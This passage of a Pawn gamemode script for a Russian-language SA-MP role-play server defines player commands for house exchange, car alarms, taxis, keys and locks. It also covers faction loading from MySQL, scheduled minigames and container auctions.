		ShowPlayerDialog(playerid,125,DIALOG_STYLE_MSGBOX,"Продажа дома",str2,"Да","Нет");
		SetPVarInt(playerid,"CHid",params[0]);
		SetPVarInt(playerid,"CHcena",params[1]);
	}
	else SendClientMessage(playerid,CGREY,"У вас нет дома");
	return true;
}
CMD:changehouse(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerHouse(playerid))
   	{
   	    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /changehouse [id] [доплата]");
	    new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете обменять дом меньше чем за $1");
		if(!GetPlayerHouse(params[0])) return SendClientMessage(playerid,CGREY,"У Игрока нет дома");
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменять свой дом?\nВы получите:{f7ae11}\n$%i\nДом №%i(%s класса){FFFFFF}\nОтдадите:\n{f7ae11}Дом №%i(%s класса)";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,params[1],GetPVarInt(params[0],"PlayerHouse"),HInfo[GetPVarInt(params[0],"PlayerHouse")][hClass],GetPVarInt(playerid,"PlayerHouse"),HInfo[GetPVarInt(playerid,"PlayerHouse")][hClass]);
		ShowPlayerDialog(playerid,113,DIALOG_STYLE_MSGBOX,"Обмен дома",str2,"Да","Нет");
		SetPVarInt(playerid,"CHid",params[0]);
		SetPVarInt(playerid,"CHcena",params[1]);
	}
	else SendClientMessage(playerid,CGREY,"У вас нет дома");
	return true;
}


CMD:sing(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	new kek = 0;
   	for(new i =0; i< MAX_VEHICLES; i++)
   	{
   	    new Float:x,Float:y,Float:z;
   	    GetVehiclePos(i,x,y,z);
   	    if(IsPlayerInRangeOfPoint(playerid,5.0,x,y,z))
   	    {
   	        for(new i1 = 1;i1 <= TOTALV; i1++)
   	        {
   	            if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
   	            if(i == VInfo[i1][vcar])
   	            {
   	                kek = i1;
   	            }
   	        }
   	    }
   	}
   	if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не рядом с вашим транспортным средством");
   	if(!VInfo[kek][vsis]) return SendClientMessage(playerid,CGREY,"У Вас не установлена система безопасности");
	if(VInfo[kek][vsing] == 0)
	{
	    VInfo[kek][vsing] =1;
   		static const fmt_string2[] = "%s включил сигнализацию";
		new str2[sizeof(fmt_string2)+32];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	    ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		SetPlayerChatBubble(playerid, "включил сигнализацию", COLOR_PURPLE, 30.0, 7000);
	}
	else
	{
	    VInfo[kek][vsing] =0;
   		static const fmt_string2[] = "%s выключил сигнализацию";
		new str2[sizeof(fmt_string2)+32];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	    ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		SetPlayerChatBubble(playerid, "выключил сигнализацию", COLOR_PURPLE, 30.0, 7000);
	}
	return true;
}
/*CMD:donate(playerid)
{
    format(query, sizeof(query), "SELECT * FROM `dona` WHERE `name` = '%s' AND `check` = '0' LIMIT 1", PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
	    new sos1[5],sos2,sos3[5],sos4;
        mysql_get_field("don", sos1),sos2 = strval(sos1);
        mysql_get_field("id", sos3),sos4 = strval(sos3);
		PlayerInfo[playerid][pDonate] += sos2;
		static const fmt_string2[] = "На Ваш счет поступило %d доната!";
		new str2[sizeof(fmt_string2)+5];
		format(str2, sizeof(str2), fmt_string2,sos2);
		SendClientMessage(playerid,CREWARD,str2);
  		mysql_fetch_row(query);
  		new query22[144];
  		format(query22, sizeof(query22), "UPDATE `dona` SET `check` = 1 WHERE id = '%d' LIMIT 1",sos4);
        mysql_query(query22);

	}
	else return SendClientMessage(playerid,-1,"Вы не пополняли счет");
	mysql_free_result();
	return 1;
}*/

CMD:taxi(playerid)
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в транспорте");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) != VInfo[v][vcar]) continue;
		if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
	}
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
	if(VInfo[kek][vobj1])
	{
        UpdateDynamic3DTextLabelText(CarLable[VInfo[kek][vcar]],-1,"");
		DestroyDynamicObject(VInfo[kek][vobj1]);
		VInfo[kek][vobj1] = 0;
		DeletePVar(playerid,"Taxist");
		DeletePVar(playerid,"MarTaxi");
		DeletePVar(playerid,"KM");
		DeletePVar(playerid,"Meh");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == false || i == playerid || GetPlayerVehicleID(i) != GetPlayerVehicleID(playerid)) continue;
			RemovePlayerFromVehicle(i);
		}
	}
	else
	{
	    query = "";
	    format(query, sizeof(query), "SELECT * FROM `taxi` WHERE `vehid` = '%d' LIMIT 1", VInfo[kek][vmodel]);
		mysql_tquery(mysql, query, "CheckTaxi", "dd", playerid,kek);

	/*	format(query, sizeof(query), "SELECT * FROM `taxi` WHERE `vehid` = '%d' LIMIT 1", VInfo[kek][vmodel]);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row_format(query))
		{
			new sos[10],Float:sos2;
	        mysql_get_field("xrot", sos),sos2 = floatstr(sos);
			mysql_free_result();
			if(sos2 == 0.0) return SendClientMessage(playerid,-1,"На вашей машине нельзя таксовать!");
			if(!PlayerInfo[playerid][pShash]) return SendClientMessage(playerid,CGREY,"У Вас нет шашки!");
			SetPVarInt(playerid,"IDCARDD",kek);
			SetPVarFloat(playerid,"IDCARDDF",sos2);
			SendClientMessage(playerid,-1,"Выберите свой тариф");
			ShowPlayerDialog(playerid,196,DIALOG_STYLE_LIST,"Выберите тариф","1 | Цена за 1км\n2 | Цена договорная","Далее","");
	    }
	    mysql_free_result();*/
    }
    return true;
}
function CheckTaxi(playerid,kek)
{
    if(cache_get_row_count(mysql)>0)
    {
        new Float:xrot = cache_get_field_content_float(0, "xrot", mysql);
        if(xrot == 0.0) return SendClientMessage(playerid,CGREY,"На Вашем транспорте нельзя таксовать!");
		if(!PlayerInfo[playerid][pShash]) return SendClientMessage(playerid,CGREY,"У Вас нет шашки!");
		SetPVarInt(playerid,"IDCARDD",kek);
		SetPVarFloat(playerid,"IDCARDDF",xrot);
		SendClientMessage(playerid,-1,"Выберите свой тариф");
		ShowPlayerDialog(playerid,196,DIALOG_STYLE_LIST,"Выберите тариф","1 | Цена за 1км\n2 | Цена договорная","Далее","");
    }
    else SendClientMessage(playerid,CGREY,"На Вашем транспорте нельзя таксовать!");
	return 1;
}
CMD:keys(playerid)
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в машине");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		}
	}
	if(PlayerInfo[playerid][pKeys] != GetPlayerVehicleID(playerid) && kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
 	if(VInfo[kek][vkeys] == 0)
	{
	    VInfo[kek][vkeys] =1;
   		static const fmt_string2[] = "%s вставил в транспорт ключи";
		new str2[sizeof(fmt_string2)+32];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	    ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		SetPlayerChatBubble(playerid, "вставил в транспорт ключи", COLOR_PURPLE, 30.0, 7000);
	}
	else
	{
	    VInfo[kek][vkeys] =0;
		//GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	//	SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
		SetEngine(playerid,GetPlayerVehicleID(playerid),false);
		SetLights(playerid,GetPlayerVehicleID(playerid),false);
   		static const fmt_string2[] = "%s вынул из транспорта ключи";
		new str2[sizeof(fmt_string2)+32];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	    ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		SetPlayerChatBubble(playerid, "вынул из транспорта ключи", COLOR_PURPLE, 30.0, 7000);
	}
	return true;
}

CMD:fixcar(playerid) return SendClientMessage(playerid,CGREY,"Используйте: /gps » Основное » Служба буксировки");
CMD:sellcargos(playerid) return SendClientMessage(playerid,CGREY,"Используйте: /gps » Основное » Утиль транспорта");
CMD:cars(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	new kek = 0;
   	query = "";
   	static const fmt_string2[] = "{FFFFFF}%s | ID: %i | Номера: %s\n";
	new str2[sizeof(fmt_string2)+64];
   	for(new i = 1; i<= TOTALV; i++)
   	{
   		if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
   	    if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0)
   	    {
   	        ListNick[playerid][kek] = i;
   	        kek++;
       		
			format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[i][vmodel]-400],VInfo[i][vcar],VInfo[i][vnumber]);
			strcat(query, str2);
   	    }
   	}
   	if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не владеете транспортом!");
   	ShowPlayerDialog(playerid,24,DIALOG_STYLE_LIST,"Транспорт",query,"Выбрать","Отмена");
   	return true;
}
CMD:lock(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /lock [id]");
/*	if(VInfo[1][vcar] <= params[0] <= VInfo[TOTALV][vcar])
	{
    	for(new i = 1; i<= TOTALV; i++)
		{
		    if(VInfo[i][vcar] == INVALID_VEHICLE_ID || params[0] != VInfo[i][vcar]) continue;
		    CarLock(playerid,params[0]);
		    break;
		}
	}*/
	if(rentcar[0] <= params[0] <= rentcar[1] || PlayerInfo[playerid][pKeys] == params[0] || Locked[params[0]] == playerid) CarLock(playerid,params[0]);
	return true;
}

stock CarLock(playerid,car)
{
	IsLocked[car] = (!IsLocked[car]) ? (true) : (false);
	CarDoors(car,IsLocked[car]);
	static const fmt_string[] = "%s открыл транспорт";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],(!IsLocked[car]) ? ("открыл") : ("закрыл"));
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "открыл/закрыл транспорт", COLOR_PURPLE, 30.0, 7000);
	static const fmt_st1ring[] = "%s %s";
	new s1tr[sizeof(fmt_st1ring)+50];
	format(s1tr, sizeof(s1tr), fmt_st1ring,VehicleNameS[GetVehicleModel(car)-400],(!IsLocked[car]) ? ("~g~OPENED"):("~r~LOCKED"));
	GameTextForPlayer(playerid,s1tr,500,5);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		PlayerTextDrawHide(playerid,SpeedometrP[0][playerid]);
		PlayerTextDrawColor(playerid, SpeedometrP[0][playerid], (!IsLocked[car]) ? (815673087):(-516080129));
		PlayerTextDrawShow(playerid,SpeedometrP[0][playerid]);
	}
	return 1;
}
CMD:ts(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, 21, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция\nПРИМЕР: 504, 1, 3, 4", "Принять", "Отмена");
	return true;
}
CMD:mn(playerid, params[]) return cmd_menu(playerid,"");
CMD:mm(playerid, params[]) return cmd_menu(playerid,"");
//========================= COMMAND END ===================================================
stock SendAdminMessage(color, str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pAdmin] > 0 && AdminLogged[i] == true) SendClientMessage(i, color, str);
	}
	return true;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(GetPVarInt(playerid,"CheckProv") > 0 || GetPVarInt(playerid,"CheckProvAdm")) return false;

	if(GetPVarInt(playerid,"AntiFlood") > gettime())
	{
	    SendClientMessage(playerid,CGREY,"Не флуди");
	    return false;
	}
	return true;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    if(!success) SendClientMessage(playerid, CGREY, "Нет такой команды");
	if(IsTextInvalid(cmdtext)) printf("CMDLOG: ВОЗМОЖНА АТАКА: %s",cmdtext);
	SetPVarInt(playerid,"AntiFlood",gettime() + 1);
	printf("Игрок %s только что использовал команду \"%s\"", PlayerInfo[playerid][pSendername], cmdtext);
	return true;
}
stock ProxDetectorNew(playerid,Float:Radi=10.0,color,text[])
{
	new Float:pos[3];
	GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(IsPlayerInRangeOfPoint(i,Radi,pos[0],pos[1],pos[2]))
		{
			if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(playerid) == GetPlayerInterior(i))SendClientMessage(i,color,text);
		}
	}
}
stock IsTextInvalid(text[])
{
	if(strfind(text, "'", true) != -1) return true;
	if(strfind(text, "%", true) != -1) return true;
	if(strfind(text, "&", true) != -1) return true;
	if(strfind(text, "*", true) != -1) return true;
	if(strfind(text, "(", true) != -1) return true;
	if(strfind(text, ")", true) != -1) return true;
	return false;
}

stock LoadFrac()
{
    new time = GetTickCount();
    new Cache:result = mysql_query(mysql, "SELECT * FROM `"TABLE_FRACTION"`");
	TOTALFRAC = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALFRAC;idx ++)
	{
	    FracInfo[idx][id] = cache_get_field_content_int(idx-1, "id", mysql);
	    cache_get_field_content(idx-1, "name", FracInfo[idx][fName], mysql, 32);
	    cache_get_field_content(idx-1, "leader", FracInfo[idx][fLeader], mysql, 32);
        cache_get_field_content(idx-1, "rank1", FracRank[idx][1], mysql, 25);
        cache_get_field_content(idx-1, "rank2", FracRank[idx][2], mysql, 25);
        cache_get_field_content(idx-1, "rank3", FracRank[idx][3], mysql, 25);
        cache_get_field_content(idx-1, "rank4", FracRank[idx][4], mysql, 25);
        cache_get_field_content(idx-1, "rank5", FracRank[idx][5], mysql, 25);
        cache_get_field_content(idx-1, "rank6", FracRank[idx][6], mysql, 25);
        cache_get_field_content(idx-1, "rank7", FracRank[idx][7], mysql, 25);
        cache_get_field_content(idx-1, "rank8", FracRank[idx][8], mysql, 25);
        cache_get_field_content(idx-1, "rank9", FracRank[idx][9], mysql, 25);
        cache_get_field_content(idx-1, "rank10", FracRank[idx][10], mysql, 32);
        cache_get_field_content(idx-1, "payday", FracInfo[idx][fPayDays], mysql, 128);
        cache_get_field_content(idx-1, "mskins", FracInfo[idx][fMSkins], mysql, 50);
		FracInfo[idx][fWSkin] = cache_get_field_content_int(idx-1, "wskin", mysql);
		FracInfo[idx][fNabor] = cache_get_field_content_int(idx-1, "nabor", mysql);
		cache_get_field_content(idx-1, "nabortext", FracInfo[idx][fNaborText], mysql, 60);
		FracInfo[idx][fNaborPos][0] = cache_get_field_content_float(idx-1, "naborx", mysql);
		FracInfo[idx][fNaborPos][1] = cache_get_field_content_float(idx-1, "nabory", mysql);
		FracInfo[idx][fNaborPos][2] = cache_get_field_content_float(idx-1, "naborz", mysql);
		FracInfo[idx][fPayDay]  = cache_get_field_content_int(idx-1, "payday1", mysql);
		
		sscanf(FracInfo[idx][fMSkins], "p<,>dddddddddd",
		FracInfo[idx][fMSkin][0],
		FracInfo[idx][fMSkin][1],
		FracInfo[idx][fMSkin][2],
		FracInfo[idx][fMSkin][3],
		FracInfo[idx][fMSkin][4],
		FracInfo[idx][fMSkin][5],
		FracInfo[idx][fMSkin][6],
		FracInfo[idx][fMSkin][7],
		FracInfo[idx][fMSkin][8],
		FracInfo[idx][fMSkin][9]);
		sscanf(FracInfo[idx][fPayDays], "p<,>iiiiiiiiii",
		FracPay[idx][1],
		FracPay[idx][2],
		FracPay[idx][3],
		FracPay[idx][4],
		FracPay[idx][5],
		FracPay[idx][6],
		FracPay[idx][7],
		FracPay[idx][8],
		FracPay[idx][9],
		FracPay[idx][10]);
	}
	
    cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadFrac' - загружено %d за %d м.с", TOTALFRAC,GetTickCount() - time);
	return true;
}
stock ClearDrift()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"DriftReg")) continue;
        GiveMoney(i,1000);
        DeletePVar(i,"DriftReg");
	}
}
stock ClearGG()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"DriftReg")) continue;
        GiveMoney(i,1000);
        DeletePVar(i,"GGReg");
	}
}
stock ClearDog()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"DogReg")) continue;
        GiveMoney(i,1000);
        SendClientMessageToAll(i,"Игра 'Догонялки' отменена из-за нехватки игроков.");
        DeletePVar(i,"DogReg");
	}
}
stock GetOnlineDrift()
{
	new kek = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"DriftReg") == 0) continue;
	    kek++;
	}
	return kek;
}
stock GetOnlineGG()
{
	new kek = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"GGReg") == 0) continue;
	    kek++;
	}
	return kek;
}
stock GetOnlineDog()
{
	new kek = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"DogReg") == 0) continue;
	    kek++;
	}
	return kek;
}
stock StartDog()
{
	if(GetOnlineDog() < 1) //5
	{
		ClearGG();
		return true;
	}
	DogTime = gettime()+180;
	DogGame = 1;
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
    	if(!IsPlayerConnected(i) || !GetPVarInt(i,"DogReg")) continue;
		SetPVarInt(i,"InDog",1);
		DeletePVar(i,"DogReg");
		if(DogVed == INVALID_PLAYER_ID)
		{
		    DogText = CreateDynamic3DTextLabel("Ведущий",0xFF0000FF,0.0,0.0,0.5,5.0,i,INVALID_VEHICLE_ID,1, 11);
		    DogVed = i;
			GameTextForPlayer(i, "~r~YOU ARE LEADING", 5000, 4);
		}
    	SpawnPlayer(i);
	}
	return true;
}
stock StartGG()
{
	if(GetOnlineGG() < 6) //5 6
	{
	    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}'GunGame' отменен. Причина: недостаточно игроков.");
		ClearGG();
		return true;
	}
	KolvIgGG= 0;
	StartRegGG = 0;
	check_gg = gettime()+360;
	InGameGG = 1;
	SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}'GunGame' начался.");
	new bool:kom;
    for(new c = 0; c <= 8; c++)
    {
        format(InfoGG[c][gName],24,"-----");
		InfoGG[c][gLevel] = 0;
		InfoGG[c][gKills] = 0;
    }
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
    	if(!IsPlayerConnected(i) || !GetPVarInt(i,"GGReg")) continue;
		if(kom) SetPVarInt(i,"KomGG",1),kom = false;
		else SetPVarInt(i,"KomGG",2),kom = true;
		KolvIgGG++;
		SetPVarInt(i,"Level",1);
		DeletePVar(i,"GGReg");
		DeletePVar(i,"KillGG");
    	SpawnPlayer(i);
	}
	return true;
}
stock StartDrift()
{
	if(GetOnlineDrift() < 5) //5
	{
	    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}'Kart Racing' отменен. Причина: недостаточно игроков.");
		ClearDrift();
		return true;
	}
	winner = INVALID_PLAYER_ID;
	StartReg = 0;
	KolvoIg = 0;
	InGame = 1;
	SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}'Kart Racing' начался. Заезд начнется через 3 секунды!");
	new check = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"DriftReg") == 0) continue;
		driftveh[check] = CreateVehicle(571,vehspawn[check][0],vehspawn[check][1],vehspawn[check][2],vehspawn[check][3],1,1,-1);
		Fuel[driftveh[check]] = 100;
//		GetVehicleParamsEx(driftveh[check],engine,lights,alarm,doors,bonnet,boot,objective);
//		SetVehicleParamsEx(driftveh[check],VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
		
	//	Engine[driftveh[check]] = true;
	//	Lights[driftveh[check]] = true;
		SetPVarInt(i,"DriftVeh",check);
		SetVehicleVirtualWorld(driftveh[check],10);
		SetPlayerVirtualWorld(i,10);
		SetPlayerInterior(i,0);
		SetPlayerPos(i,vehspawn[check][0],vehspawn[check][1],vehspawn[check][2]);
		PutPlayerInVehicle(i, driftveh[check], 0);
		SetEngine(i,driftveh[check],true);
		SetLights(i,driftveh[check],true);
		check++;
		KolvoIg++;
	 	TogglePlayerControllable(i,0);
		DeletePVar(i,"DriftReg");
  		SetPVarInt(i,"InDrift",1);
		SetTimerEx("GoRace",3000,false,"i",i);
  		GameTextForPlayer(i,"~g~WAIT 3 SECONDS",500,5);
	}
	return true;
}
function GoRace(playerid)
{
    TogglePlayerControllable(playerid,1);
    GameTextForPlayer(playerid,"~g~GO!",500,5);
    SetPlayerRaceCheckpoint(playerid, 0,racech[0][0], racech[0][1], racech[0][2], racech[1][0], racech[1][1], racech[1][2], 5);
	return 1;
}

function GetWinner(cont)
{
    new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
        new idacc;
        for(new row = 1; row<= rows; row++)
		{
		    idacc = cache_get_field_content_int(row-1, "idacc", mysql);
		    //give priz
		    query = "";
		    static moneyrand[10];
		    static donate[10];
		    static invs[13];
		    static vehs[7];
			if(cont < 4)
			{
				moneyrand = {1000,1500,2000,2500,3000,3500,4000,4500,5000,5500};
				donate = {10,15,20,25,30,35,40,45,50,55};
				invs ={436,437,438,439,440,297,296,295,294,293,263,233,219};
				vehs = {410,467,474,479,422,500,543};
			    switch(random(16))
			    {
			        case 0..5: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,moneyrand[random(10)],T_MONEY);
			        case 6..8: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,donate[random(10)],T_DONATE);
			        case 9..13: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,kolvo,type) VALUES ('%d','%d','1','%d')", idacc,invs[random(13)],T_INV);
		         	case 14..15: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,vehs[random(7)],T_VEH);
			    }
			}
			else
			{
			    moneyrand = {5500,6000,6500,7000,7500,8000,8500,9000,9500,10000};
				donate = {55,60,65,70,75,80,85,90,95,100};
				invs ={436,437,438,439,440,297,296,295,294,293,263,233,219};
				vehs = {489,502,568,503,502,495,434};
            	switch(random(17))
			    {
			        case 0..5: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,moneyrand[random(10)],T_MONEY);
			        case 6..8: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,donate[random(10)],T_DONATE);
			        case 9..11: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,kolvo,type) VALUES ('%d','%d','1','%d')", idacc,invs[random(13)],T_INV);
		         	case 12..16: format(query, sizeof(query), "INSERT INTO prize (idacc,prize,type) VALUES ('%d','%d','%d')", idacc,vehs[random(7)],T_VEH);
			    }
			}
			mysql_tquery(mysql,query);
		    query = "";
			format(query, sizeof(query), "DELETE FROM containers WHERE idacc = '%d' AND container = '%d'", idacc,cont);
			mysql_tquery(mysql,query);
		}
		
	}
    return 1;
}
function BackBet(cont)
{
    new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
        new stavka,names[24],idacc;
        for(new row = 1; row<= rows; row++)
		{
  			cache_get_field_content(row-1, "name", names, mysql);
  			stavka = cache_get_field_content_int(row-1, "stavka", mysql);
  			idacc = cache_get_field_content_int(row-1, "idacc", mysql);
  			new player = GetPlayerID(names);
			if(player != INVALID_PLAYER_ID)
			{
			    if(cont < 4) GiveMoney(player,stavka*80/100);
			    else PlayerInfo[player][pDonate] += stavka*80/100;
			}
			else
			{
			    if(cont < 4) SetPlayerInt(names,"cash",stavka*80/100);
			    else SetPlayerInt(names,"donate",stavka*80/100);
			}
			query = "";
			format(query, sizeof(query), "DELETE FROM containers WHERE idacc = '%d' AND container = '%d'", idacc,cont);
			mysql_tquery(mysql,query);
		}
	}
    return 1;
}

function SecUpdate()
{
    GlobalAfkCheck();
	new hour,minut,sec;
	gettime(hour,minut,sec);
	if(Paydah != hour)
	{
	    Paydah=hour;
	    SetWorldTime(hour);
		PayDayGo();
	}
	if(texttimer < gettime())
	{
	    SendClientMessageToAll(CREWARD,"=====================================================================================================");
	    SendClientMessageToAll(CREWARD,"[Информация] {FFFFFF}Вы играете на проекте Maryland Role Play. Администрация желает вам приятной игры.");
	    SendClientMessageToAll(CREWARD,"[Информация] {FFFFFF}Если у вас есть вопросы обратитесь в (/ask) наши агенты вам помогут!");
	    SendClientMessageToAll(CREWARD,"[Информация] {FFFFFF}Официальный донат на проекте осуществляется через официальный сайт maryland-rp.ru.");
	    SendClientMessageToAll(CREWARD,"=====================================================================================================");
	    texttimer = gettime()+60*45;
	    
	}
	if(hour == 17 && minut == 01 && sec == 00)
	{
	    new g_Date[3];
		getdate(g_Date[0], g_Date[1], g_Date[2]);
	    new weekday = GetWeekDay(g_Date[2],g_Date[1],g_Date[0]);
	    if(weekday == 3 || weekday == 5 || weekday == 0)
	    {
	        SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF} Аукцион контейнеров начался! Сделать ставку можно в Порту Los Santos.");
		    for(new i = 0; i < 6; i++)
		    {
		        if(Containers[i]) continue;
		        Containers[i] = true;
		        MaxBet[i] = 0;
		        
		        if(i < 4) UpdateDynamic3DTextLabelText(ContText[i],-1,"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}0$");
		        else UpdateDynamic3DTextLabelText(ContText[i],-1,"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}0 Donate Points");
		    }
	    }
	}
	if(hour == 21 && minut == 01 && sec == 00)
	{
	    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF} Аукцион контейнеров закончился!");
	    for(new i = 0; i < 6; i++)
	    {
	        if(!Containers[i]) continue;
	        Containers[i] = false;
	        MaxBet[i] = 0;
	        query = "";
	        
	        UpdateDynamic3DTextLabelText(ContText[i],-1,"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Остановлен");
			format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' ORDER BY `stavka` DESC LIMIT 1",i);
			mysql_tquery(mysql, query, "GetWinner", "d", i);
			format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d'",i);
			mysql_tquery(mysql, query, "BackBet", "d", i);
	    }
	}
	if(StartTime == 0 && InGame == 0)
	{
		if((hour == 0 || hour == 2 || hour == 4 || hour == 6|| hour == 8|| hour == 10|| hour == 12 || hour == 14|| hour == 16|| hour == 18 || hour == 20|| hour == 22) && minut == 01 && sec == 00)
		{
            StartTime = 300;
            StartReg = 1;
            SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Объявлена регистрация на 'Kart Racing'. Начало через 5 минут.");
		}
	}
	else
	{
		if(StartTime > 1)
		{
		    StartTime--;
			if(StartTime == 120) SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Регистрация на 'Kart Racing'. Начало через 2 минуты.");
		}
		else if(StartTime == 1) StartDrift(),StartTime = 0;
	}
	if(StartTimeGG == 0 && InGameGG == 0)
	{
		if((hour == 1 || hour == 3 || hour == 5 || hour == 7|| hour == 9|| hour == 11|| hour == 13 || hour == 15|| hour == 17|| hour == 19 || hour == 21|| hour == 23) && minut == 01 && sec == 00)
		{
            StartTimeGG = 300;
            StartRegGG = 1;
            SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Объявлена регистрация на 'GunGame'. Начало через 5 минут.");
		}
	}
	else
